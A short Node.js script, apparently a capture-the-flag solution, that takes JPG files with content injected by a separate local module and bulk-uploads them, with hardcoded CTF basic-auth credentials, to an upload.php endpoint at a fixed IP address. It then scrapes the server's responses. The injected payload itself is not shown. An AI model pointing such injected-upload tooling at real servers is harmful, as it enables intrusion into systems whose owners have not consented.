const fs = require('fs')
const path = require('path')
const globby = require('globby')
const got = require('got')
const FormData = require('form-data')
const cheerio = require('cheerio')
const pAll = require('p-all')
const { base64 } = require('../common/utils')
const inject = require('./inject')

const HOST = 'http://117.51.148.166'
const UPLOAD_CONCURRENCY = 3
const gotty = got.extend({
  headers: {
    'Authorization': `Basic ${base64.encode('dd@ctf:DD@ctf#000')}`,
  },
})

async function upload (filePath) {
  const url = `${HOST}/upload.php?type=upload`
  const form = new FormData()
  form.append('file', fs.createReadStream(filePath))
  const response = await gotty.post(url, {
    body: form,
  })
  const { body } = response
  const $ = cheerio.load(body)
  const source = `${HOST}/${$('img').attr('src')}`
  const message = body.split('<br>')[1] || body.split('<br>')[0]
  return {
    source,
    message,
  }
}

async function main (forceRegenerate = false) {
  try {
    let files = await globby('vendors/injected/*.jpg', { cwd: __dirname, absolute: true })
    if (!files.length || forceRegenerate) {
      files = await inject()
    }
    console.log('Uploading...')
    let results = await pAll(files.map((file) => {
      return () => upload(file)
    }), {
      concurrency: UPLOAD_CONCURRENCY,
    })
    console.log(results)
  } catch (error) {
    console.log(error)
    console.error(`Error: ${error.message}`)
  }
}

main()
